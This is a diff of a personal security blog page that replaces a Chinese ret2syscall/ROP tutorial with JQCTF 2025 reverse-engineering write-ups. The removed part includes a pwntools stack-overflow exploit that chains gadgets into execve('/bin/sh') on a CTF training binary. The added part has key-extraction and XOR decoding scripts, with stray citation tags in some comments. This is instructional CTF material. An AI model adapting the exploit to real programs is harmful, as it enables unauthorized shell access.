@@ -22,11 +22,11 @@
   
 
 <title>
-  Ret2syscall | Cyzrjz
+  JQCTF2025 | Cyzrjz
 </title>
 <meta
   name="description"
-  content="基础ROP"
+  content="少女祈祷中..."
 />
 
 
@@ -114,12 +114,12 @@
 
 
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="Ret2syscall | Cyzrjz" />
+  <meta property="og:title" content="JQCTF2025 | Cyzrjz" />
   <meta
     property="og:description"
-    content="基础ROP"
+    content="少女祈祷中..."
   />
-  <meta property="og:url" content="https://cyzrjz.github.io/post/ret2syscall/" />
+  <meta property="og:url" content="https://cyzrjz.github.io/post/jqctf2025/" />
   <meta
     property="og:site_name"
     content="W31c0me t0 My610g"
@@ -129,10 +129,10 @@
     content="/"
   />
   <meta property="article:author" content="Cyzrjz" />
-  <meta property="article:published_time" content="2025-04-19T22:06:54&#43;08:00" />
-  <meta property="article:modified_time" content="2025-04-19T22:06:54&#43;08:00" />
+  <meta property="article:published_time" content="2025-04-25T20:39:56&#43;08:00" />
+  <meta property="article:modified_time" content="2025-04-25T20:39:56&#43;08:00" />
   
-    <meta property="article:tag" content="pwn基础理论" />
+    <meta property="article:tag" content="逆向线上赛" />
   
   
   <meta name="twitter:card" content="summary" />
@@ -341,7 +341,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/my/banner.png" alt="Ret2syscall">
+          <img  fetchpriority="high" src="/images/my/banner.png" alt="JQCTF2025">
         
       
     
@@ -357,7 +357,7 @@
   
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">Ret2syscall</h1>
+            <h1 data-aos="slide-up">JQCTF2025</h1>
           </a>
         
       
@@ -392,20 +392,16 @@
   <div class="sidebar-toc-wrapper toc-div-class">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#前置知识">前置知识</a>
+    <li><a href="#第三届京麒ctf-jqctf-2025-热身赛-re1">第三届京麒CTF-JQCTF-2025-热身赛-re1</a>
       <ul>
-        <li><a href="#system函数">system()函数</a></li>
+        <li><a href="#分析">分析</a></li>
+        <li><a href="#exp">exp</a></li>
       </ul>
     </li>
-    <li><a href="#ropreturn-oriented-programming-返回导向编程">ROP(Return-Oriented Programming)-返回导向编程</a>
+    <li><a href="#第三届京麒ctf-jqctf-2025-热身赛-re2">第三届京麒CTF-JQCTF-2025-热身赛-re2</a>
       <ul>
-        <li><a href="#gadget">gadget</a></li>
-        <li><a href="#构造rop链">构造ROP链</a></li>
-      </ul>
-    </li>
-    <li><a href="#举例">举例</a>
-      <ul>
-        <li><a href="#ctf-wiki-ret2syscall">CTF-Wiki-ret2syscall</a></li>
+        <li><a href="#分析-1">分析</a></li>
+        <li><a href="#exp-1">exp</a></li>
       </ul>
     </li>
   </ul>
@@ -551,11 +547,11 @@
     class="article-date-link"
     data-aos="zoom-in"
   >
-    <time datetime="2025-04-19 22:06:54 &#43;0800 &#43;0800" itemprop="datePublished"
-      >2025-04-19</time
+    <time datetime="2025-04-25 20:39:56 &#43;0800 &#43;0800" itemprop="datePublished"
+      >2025-04-25</time
     >
     <time style="display: none;" id="post-update-time"
-      >2025-04-19</time
+      >2025-04-25</time
     >
   </span>
 </div>
@@ -570,143 +566,97 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h2 id="前置知识">
-<a class="header-anchor" href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86"></a>
-前置知识
-</h2><p>假设有以下程序</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;hello world&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nf">my_puts</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
+        <h2 id="第三届京麒ctf-jqctf-2025-热身赛-re1">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%89%e5%b1%8a%e4%ba%ac%e9%ba%92ctf-jqctf-2025-%e7%83%ad%e8%ba%ab%e8%b5%9b-re1"></a>
+第三届京麒CTF-JQCTF-2025-热身赛-re1
+</h2><p><a href="/process/JQCTF/re/re1/re1.exe">JQCTF2025-热身赛-re1</a></p>
+<h3 id="分析">
+<a class="header-anchor" href="#%e5%88%86%e6%9e%90"></a>
+分析
+</h3><p>Rust逆向,头一回见,直接拖入IDA分析</p>
+<p>函数看起来都很奇怪,动态调试看看
+<img src="img/image-20.png" alt="alt text">
+运行到这个call时，提示输入字符串，然后输入后终端输出err,说明所有的判断或加密都在这个call里，步入看看
+<img src="img/image-21.png" alt="alt text">
+到这里再按F5反编译,就是用户函数了</p>
+<p>一看300多行代码,直接转到最后面
+<img src="img/image-22.png" alt="alt text">
+找到判断函数
+<img src="img/image-23.png" alt="alt text"></p>
+<p>分析v29是什么,
+<code>v29 = *(_WORD *)Src_9;</code>
+其中Src_9是我输入的字符串，WORD获取2字节，由于已知输入的字符串必定是flag的形式,所以可以猜测v29是flag的第2个字节，就是fl</p>
+<p>中间的加密比较复杂，但是注意到在前面创建密钥时，并没有用到我们输入的后面的内容，所以可以动调获取密钥，查看buf2有42个字节，所以要爆破用于xor的42个密钥</p>
+<p>鼠标点击<code>Buf1[Size_2] = *(_BYTE *)(Src_9 + Size_2) ^ (Size_2 + ((2 * (v35 &amp; 0x55)) | (v35 &gt;&gt; 1) &amp; 0x55));</code>所在行，按下Tab键，可以转到该行代码的汇编代码
+在此处下断点，然后开始动调
+<img src="img/image-24.png" alt="alt text">
+<img src="img/image-25.png" alt="alt text">
+可以看到[r14+rax]就是我们输入的字符串，cl就是要异或的密钥，所以我们可以用idc爆破cl</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;idc.idc&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">static</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">auto</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">42</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Message</span><span class="p">(</span><span class="s">&#34;0x%X,&#34;</span><span class="p">,</span><span class="n">GetRegValue</span><span class="p">(</span><span class="s">&#34;CL&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">RunTo</span><span class="p">(</span><span class="mh">0x7FF79CE91534</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GetDebuggerEvent</span><span class="p">(</span><span class="n">WFNE_SUSP</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">my_puts</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>代码很简单,就是输出字符串&quot;hello world&quot;
-但这一串代码在操作系统层面如何实现?</p>
-<pre class="mermaid">flowchart LR
-    A["my_puts()"] --> B["write()"] --> C["sys_write()"] --> D["标准输出"]
-</pre>
-<p>my_puts()调用了动态链接库libc.so中的write()函数
-write(1,&amp;&ldquo;hello world&rdquo;,12)
-write()将传入参数包装为汇编代码<code>[eax = 4;ebx = 1;ecx = &amp;&quot;hello world&quot;;edx = 12;] + int 0x80;</code>
-<strong>write()函数其实就是对write系统调用的封装</strong>
-执行完成后才进入了内核kernel中的sys_write()函数
-sys_write()函数会将字符串&quot;hello world&quot;写入到标准输出设备中</p>
-<ul>
-<li><strong>什么是系统调用</strong></li>
-</ul>
-<ol>
-<li>系统调用是操作系统提供给用户态程序调用的接口，它是操作系统内核与用户态程序之间的接口，它提供了系统调用的入口，用户态程序通过系统调用与内核进行交互。</li>
-<li>本质上时一些内核函数代码(一段指令),以规范的方式驱动硬件</li>
-<li>x86通过int 0x80指令实现系统调用,amd64通过syscall指令实现系统调用</li>
-</ol>
-<ul>
-<li><strong>什么是libc.so</strong>
-这是一个动态链接库，它包含了系统调用的实现，如open(),read(),write()等等,libc.so随着系统版本更新也会进行更新
-操作系统如何调用不同版本的libc的同一个函数呢?
-这里可以类比Windows系统创建的快捷方式,无论软件版本怎么变化,快捷方式都指向同一个文件,当快捷方式被点击时,系统会自动调用对应的程序</li>
-</ul>
-<h3 id="system函数">
-<a class="header-anchor" href="#system%e5%87%bd%e6%95%b0"></a>
-system()函数
-</h3><p>有了上面的基础,可以知道system()其实是对execve()系统调用的封装,execve()可以执行外部可执行文件,system()可以执行外部命令</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span> <span class="c1">; execve系统调用号,在x86架构中,eax寄存器存放系统调用号</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mh">0x80</span> <span class="c1">; 调用系统调用</span>
-</span></span></code></pre></div><p>这段汇编实现了execve(&quot;/bin/sh&quot;,0,0)系统调用,即执行/bin/sh命令</p>
-<p><strong>但是在程序中没有存在这一段汇编怎么办?</strong>
-<strong>请看ROP-返回导向编程</strong></p>
-<h2 id="ropreturn-oriented-programming-返回导向编程">
-<a class="header-anchor" href="#ropreturn-oriented-programming-%e8%bf%94%e5%9b%9e%e5%af%bc%e5%90%91%e7%bc%96%e7%a8%8b"></a>
-ROP(Return-Oriented Programming)-返回导向编程
-</h2><p>ROP是一种攻击技术，它利用程序的控制流和数据结构，通过控制程序的执行流程，以达到控制目标程序的目的。</p>
-<h3 id="gadget">
-<a class="header-anchor" href="#gadget"></a>
-gadget
-</h3><p>gadget就是位于text段的可执行代码，它可以被用来控制程序的执行流程。</p>
-<p>在Linux系统中,可以只用ROPgadget来获取gadget</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary file --only <span class="s2">&#34;pop|ret&#34;</span>
-</span></span></code></pre></div><p><img src="/post/ret2syscall/img/image.png" alt="alt text"></p>
-<p>我们随便找一行看看再ida中是什么样的</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x080481c9</span> <span class="p">:</span> <span class="nv">pop</span> <span class="nb">ebx</span> <span class="c1">; ret</span>
-</span></span></code></pre></div><p><img src="/post/ret2syscall/img/image-1.png" alt="alt text">
-可以看到这两行汇编指令的意思就是将栈顶的数值弹出到ebx寄存器中,然后再将栈顶的地址pop给eip</p>
-<p>知道了这些,就可以开始构造system()函数的ROP链了</p>
-<h3 id="构造rop链">
-<a class="header-anchor" href="#%e6%9e%84%e9%80%a0rop%e9%93%be"></a>
-构造ROP链
-</h3><ul>
-<li><strong>流程图</strong>
-<img src="/post/ret2syscall/img/f7db7389fc756b7b4e6a0e8fe98798ef.png" alt="alt text">
-随着ROP链的变化,可能不完全是流程图里所说的,但大体思路是这样的</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 准备参数</span>
-</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">eax</span> <span class="c1">; ret</span>
-</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">ebx</span> <span class="c1">; ret</span>
-</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">ecx</span> <span class="c1">; ret</span>
-</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">edx</span> <span class="c1">; ret</span>
+</span></span></code></pre></div><p><img src="img/image-26.png" alt="alt text">
+可以看到key已经爆破出来了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x66</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0x9A</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x3E</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xE3</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0xD9</span><span class="p">,</span><span class="mh">0xA7</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0x3B</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x64</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x9A</span><span class="p">,</span><span class="mh">0x1E</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x4E</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xBB</span><span class="p">,</span><span class="mh">0x5A</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x0D</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0xE9</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0x3A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x4E</span><span class="p">,</span><span class="mh">0x76</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></div><p>接下来就是简单的xor了</p>
+<h3 id="exp">
+<a class="header-anchor" href="#exp"></a>
+exp
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0x00</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xFB</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x1C</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0x1B</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0xD4</span><span class="p">,</span><span class="mh">0x8C</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0xF4</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0xB9</span><span class="p">,</span><span class="mh">0x8B</span><span class="p">,</span><span class="mh">0x0F</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0x02</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x7E</span><span class="p">,</span><span class="mh">0xAE</span><span class="p">,</span><span class="mh">0xDF</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0xDA</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xB0</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0x9A</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="mh">0x2B</span><span class="p">,</span><span class="mh">0x0B</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x66</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0x9A</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x3E</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xE3</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0xD9</span><span class="p">,</span><span class="mh">0xA7</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0x3B</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x64</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x9A</span><span class="p">,</span><span class="mh">0x1E</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x4E</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xBB</span><span class="p">,</span><span class="mh">0x5A</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x0D</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0x86</span><span class="p">,</span><span class="mh">0xE9</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0x3A</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x4E</span><span class="p">,</span><span class="mh">0x76</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">buf2</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><blockquote>
+<p>flag{1c98572d-7f7b-4fbf-8750-4a2986c695ce}</p></blockquote>
+<h2 id="第三届京麒ctf-jqctf-2025-热身赛-re2">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%89%e5%b1%8a%e4%ba%ac%e9%ba%92ctf-jqctf-2025-%e7%83%ad%e8%ba%ab%e8%b5%9b-re2"></a>
+第三届京麒CTF-JQCTF-2025-热身赛-re2
+</h2><p><a href="/process/JQCTF/re/re2/re2.exe">JQCTF2025-热身赛-re1</a></p>
+<h3 id="分析-1">
+<a class="header-anchor" href="#%e5%88%86%e6%9e%90-1"></a>
+分析
+</h3><p>IDA打开,f5反编译，发现是see3指令集
+<img src="img/image-32.png" alt="alt text">
+排列顺序和加法常量都给了
+<img src="img/image-33.png" alt="alt text">
+直接对每位<strong>减常量后再反转</strong>就行了</p>
+<h3 id="exp-1">
+<a class="header-anchor" href="#exp-1"></a>
+exp
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;cge87k?9&lt;&gt;?@=pss393=&gt;;8@:Cp@DAuH&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">; 调用execve(&#34;/bin/sh&#34;,0,0)</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span> <span class="c1">; execve系统调用号,在x86架构中,eax寄存器存放系统调用号</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mh">0x80</span> <span class="c1">; 调用系统调用</span>
-</span></span></code></pre></div><h2 id="举例">
-<a class="header-anchor" href="#%e4%b8%be%e4%be%8b"></a>
-举例
-</h2><h3 id="ctf-wiki-ret2syscall">
-<a class="header-anchor" href="#ctf-wiki-ret2syscall"></a>
-CTF-Wiki-ret2syscall
-</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
-<p>利用ROPgadget分别用</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary rop --only <span class="s1">&#39;pop|ret&#39;</span>
-</span></span><span class="line"><span class="cl">ROPgadget --binary rop --string <span class="s1">&#39;/bin/sh&#39;</span>
-</span></span><span class="line"><span class="cl">ROPgadget --binary rop --only <span class="s1">&#39;int&#39;</span> <span class="c1">#系统调用</span>
-</span></span></code></pre></div><p>找到</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0806eb90</span> <span class="p">:</span> <span class="nv">pop</span> <span class="nb">edx</span> <span class="c1">; pop ecx ; pop ebx ; ret</span>
-</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x080bb196</span> <span class="p">:</span> <span class="nv">pop</span> <span class="nb">eax</span> <span class="c1">; ret</span>
-</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x08049421</span> <span class="p">:</span> <span class="nv">int</span> <span class="mh">0x80</span>
-</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x080be408</span> <span class="p">:</span> <span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>
-</span></span></code></pre></div><p>gdb调试程序,找到栈溢出点
-输入废物数据填充缓冲区,找到字符串开始的地方和ebp的地方分别为</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffcabc</span> <span class="c1">;开始填充</span>
-</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffcb28</span> <span class="c1">;ebp</span>
-</span></span></code></pre></div><p><img src="/post/ret2syscall/img/image-2.png" alt="alt text"></p>
-<ul>
-<li><strong>构造exploit</strong></li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span> <span class="c1">#设置架构</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inv_block</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub</span> <span class="o">=</span> <span class="p">[(</span><span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)]</span>        <span class="c1"># 减 mask2，并 wrap-around :contentReference[oaicite:4]{index=4}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">sub</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>                                <span class="c1"># mask1 反转即[::-1] :contentReference[oaicite:5]{index=5}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 找到gadget</span>
-</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
-</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
-</span></span><span class="line"><span class="cl"><span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
-</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x080be408</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
-</span></span></span><span class="line"><span class="cl"><span class="s1">构造payload
-</span></span></span><span class="line"><span class="cl"><span class="s1">使用flat自动地将多种类型的输入（整数、字符串、字节串、嵌套列表等）“打平”并按上下文（字长、大小端）正确地打包成一个连续的 bytes 对象，省去了手动 p32()/p64()、拼接和填充的繁琐步骤
-</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
-</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span><span class="p">(</span><span class="mh">0xffffcb28</span> <span class="o">-</span> <span class="mh">0xffffcabc</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span>
-</span></span><span class="line"><span class="cl">    <span class="n">pop_eax_ret</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="mh">0xb</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">pop_edx_ecx_ebx_ret</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">bin_sh</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">int_0x80</span>
-</span></span><span class="line"><span class="cl"><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1">#进入交互模式</span>
-</span></span></code></pre></div><p>成功打通
-<img src="/post/ret2syscall/img/image-3.png" alt="alt text"></p>
+</span></span><span class="line"><span class="cl"><span class="n">flag_bytes</span> <span class="o">=</span> <span class="n">inv_block</span><span class="p">(</span><span class="n">cipher</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span> <span class="o">+</span> <span class="n">inv_block</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> 
+</span></span></code></pre></div><blockquote>
+<p>flag{cdb0444318e24beb8f374e9181599072}</p></blockquote>
 
       
     </div>
@@ -731,18 +681,18 @@ CTF-Wiki-ret2syscall
     <li class="article-tag-list-item" data-aos="zoom-in">
       <a
